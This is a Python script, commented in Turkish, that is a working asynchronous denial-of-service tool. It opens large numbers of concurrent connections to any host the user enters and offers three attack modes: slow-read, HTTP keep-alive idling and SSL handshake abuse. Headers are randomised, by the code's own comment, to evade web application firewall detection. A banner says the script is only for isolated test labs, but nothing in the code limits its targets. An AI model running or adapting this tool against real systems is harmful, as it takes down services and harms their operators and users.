# -*- coding: utf-8 -*-

import asyncio
import socket
import ssl
import random
import sys

# =================================================================================
# UYARI: BU BETİK, ÖNCEKİ VERSİYONA GÖRE ÇOK DAHA GÜÇLÜ VE YOĞUN TRAFİK ÜRETİR.
# ASENKRON YAPISI SAYESİNDE KISA SÜREDE BİNLERCE BAĞLANTI AÇABİLİR.
# KESİNLİKLE CANLI SİSTEMLERDE KULLANMAYIN. YALNIZCA KONTROLLÜ VE İZOLE TEST
# ORTAMLARINDA, WAF VE GÜVENLİK SİSTEMLERİNİZİN EŞİKLERİNİ TEST ETMEK
# AMACIYLA KULLANIN. KULLANIMINDAN DOĞAN TÜM SORUMLULUK SİZE AİTTİR.
# =================================================================================

# Gerçekçi görünmesi için User-Agent listesi
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
]

class AsyncDDoSSimulator:
    def __init__(self, target_host, target_port, num_connections):
        self.target_host = target_host
        self.target_port = int(target_port)
        self.num_connections = int(num_connections)
        self.resolved_ip = None
        self.tasks = []
        self.successful_connections = 0
        self.failed_connections = 0

    async def resolve_host(self):
        """Alan adını asenkron olarak çöz."""
        try:
            loop = asyncio.get_running_loop()
            info = await loop.getaddrinfo(self.target_host, self.target_port, proto=socket.IPPROTO_TCP)
            self.resolved_ip = info[0][4][0]
            print(f"[+] Hedef çözümlendi: {self.target_host} -> {self.resolved_ip}")
            return True
        except socket.gaierror:
            print(f"[-] Hata: Alan adı çözümlenemedi: '{self.target_host}'")
            return False

    def _get_random_headers(self):
        """WAF tespiti zorlaştırmak için rastgele başlıklar oluşturur."""
        user_agent = random.choice(USER_AGENTS)
        headers = (
            f"Host: {self.target_host}\r\n"
            f"User-Agent: {user_agent}\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
            f"Accept-Language: en-US,en;q=0.5\r\n"
            f"Accept-Encoding: gzip, deflate\r\n"
            f"Connection: keep-alive\r\n\r\n"
        )
        return headers

    async def _create_connection(self, use_ssl=False):
        """Asenkron olarak tek bir soket bağlantısı oluşturur."""
        ssl_context = None
        if use_ssl:
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
        
        try:
            reader, writer = await asyncio.open_connection(
                self.resolved_ip, self.target_port, ssl=ssl_context, server_hostname=self.target_host if use_ssl else None
            )
            self.successful_connections += 1
            return reader, writer
        except Exception:
            self.failed_connections += 1
            return None, None

    async def slow_read_worker(self):
        """Asenkron Slow Read simülasyonu."""
        reader, writer = await self._create_connection()
        if not writer:
            return
            
        request = f"GET / HTTP/1.1\r\n{self._get_random_headers()}"
        writer.write(request.encode())
        await writer.drain()

        try:
            while True:
                data = await asyncio.wait_for(reader.read(1), timeout=30)
                if not data:
                    break
                await asyncio.sleep(10)
        except (asyncio.TimeoutError, ConnectionResetError, BrokenPipeError):
            pass
        finally:
            writer.close()
            await writer.wait_closed()

    async def http_idle_worker(self):
        """Asenkron HTTP Idle simülasyonu."""
        reader, writer = await self._create_connection()
        if not writer:
            return

        request = f"GET / HTTP/1.1\r\n{self._get_random_headers()}"
        writer.write(request.encode())
        await writer.drain()

        try:
            # Bağlantıyı sonsuza dek açık tutmaya çalış
            await asyncio.Event().wait()
        except asyncio.CancelledError:
            pass
        finally:
            writer.close()
            await writer.wait_closed()
            
    async def ssl_handshake_abuse_worker(self):
        """Asenkron SSL Handshake simülasyonu."""
        reader, writer = await self._create_connection(use_ssl=True)
        if not writer:
            return

        # Sadece handshake'i tamamla ve bağlantıyı boşta bırak
        try:
            await asyncio.Event().wait()
        except asyncio.CancelledError:
            pass
        finally:
            writer.close()
            await writer.wait_closed()

    async def run(self, mode):
        if not await self.resolve_host():
            return

        workers = {
            "1": (self.slow_read_worker, "Slow Read"),
            "2": (self.http_idle_worker, "HTTP Idle (Keep-Alive)"),
            "3": (self.ssl_handshake_abuse_worker, "SSL/TLS Handshake Abuse"),
        }
        
        if mode not in workers:
            print("[-] Geçersiz mod seçimi.")
            return
            
        worker_func, mode_name = workers[mode]

        print(f"\n[!] Gelişmiş Simülasyon Başlatılıyor...")
        print(f"[!] Mod: {mode_name}")
        print(f"[!] Hedef: {self.target_host}:{self.target_port} (IP: {self.resolved_ip})")
        print(f"[!] Bağlantı Sayısı: {self.num_connections}")
        print("[!] Durdurmak için CTRL+C tuşlarına basın.\n")

        for _ in range(self.num_connections):
            task = asyncio.create_task(worker_func())
            self.tasks.append(task)
        
        # Durdurulana kadar çalış
        while True:
            await asyncio.sleep(5)
            print(f"[i] Durum: {self.successful_connections} başarılı, {self.failed_connections} başarısız bağlantı denemesi.")


async def main():
    print("="*60)
    print("Gelişmiş Siber Güvenlik Test Laboratuvarı - DoS Simülatörü (Async)")
    print("="*60)
    
    if sys.version_info < (3, 7):
        sys.exit("[-] Bu betik Python 3.7 veya üstü bir sürüm gerektirir (asyncio özellikleri için).")
        
    try:
        target_host_input = input("[?] Lütfen test edilecek hedef alan adını veya IP adresini girin: ")
        target_port_input = input("[?] Lütfen hedef portu girin (HTTP:80, HTTPS:443): ")
        num_connections_input = input("[?] Eş zamanlı kaç bağlantı hedeflensin? (örn. 1000): ")
        
        print("\nLütfen bir simülasyon modu seçin:")
        print("  [1] Slow Read Simülasyonu")
        print("  [2] HTTP Idle (Keep-Alive) Simülasyonu")
        print("  [3] SSL/TLS Handshake Abuse Simülasyonu (hedef port 443 olmalıdır)")
        attack_mode = input("Seçiminiz [1, 2 veya 3]: ")
        
        simulator = AsyncDDoSSimulator(
            target_host=target_host_input,
            target_port=target_port_input,
            num_connections=int(num_connections_input)
        )
        
        main_task = asyncio.create_task(simulator.run(attack_mode))
        await main_task

    except (ValueError, KeyError):
        print("\n[-] Hata: Lütfen sayısal değerleri veya mod seçimini doğru girdiğinizden emin olun.")
    except KeyboardInterrupt:
        print("\n\n[!] CTRL+C algılandı. Simülasyon durduruluyor...")
    except Exception as e:
        print(f"\n[-] Ana programda beklenmedik bir hata oluştu: {e}")
    finally:
        print("[i] Tüm görevler iptal ediliyor...")
        tasks = [t for t in asyncio.all_tasks() if t is not asyncio.current_task()]
        for task in tasks:
            task.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
        print("[+] Simülasyon temiz bir şekilde sonlandırıldı.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[+] Program kapatıldı.")
